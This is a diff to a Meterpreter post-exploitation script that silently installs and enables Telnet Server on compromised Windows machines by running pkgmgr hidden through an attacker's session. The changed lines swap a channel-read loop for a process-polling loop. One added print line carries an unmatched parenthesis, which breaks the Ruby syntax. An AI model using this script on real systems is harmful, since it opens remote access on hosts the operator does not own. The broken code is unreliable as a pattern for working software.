@@ -3,7 +3,7 @@
 #Meterpreter script for enabling Telnet Server on Windows 2003, Windows Vista
 #Windows 2008 and Windows XP targets using native windows commands.
 #Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.1.1
+#Verion: 0.1.2
 #Note: If the Telnet Server is not installed in Vista or win2k8
 #	it will be installed.
 ################## Variable Declarations ##################
@@ -65,14 +65,25 @@ def insttlntsrv(session)
 		if checkifinst(session)
 			print_status("Telnet Service Installed on Target")
 		else
-			print_status("Installing Telnet Server Service ......")
+			print "[*] Installing Telnet Server Service ......")
 			session.response_timeout=90
 			r = session.sys.process.execute("pkgmgr /iu:\"TelnetServer\"",nil, {'Hidden' => true, 'Channelized' => true})
-			while(d = r.channel.read)
-				tmpout << d
+			sleep(2)
+			prog2check = "pkgmgr.exe"
+			found = 0
+			while found == 0
+				session.sys.process.get_processes().each do |x|
+					found =1
+					if prog2check == (x['name'].downcase)
+						print "."
+						sleep(0.5)
+						found = 0
+					end
+				end
 			end
 			r.channel.close
 			r.close
+			print_status("Finnished installing the Telnet Service.")
 			end
 		end
 	end
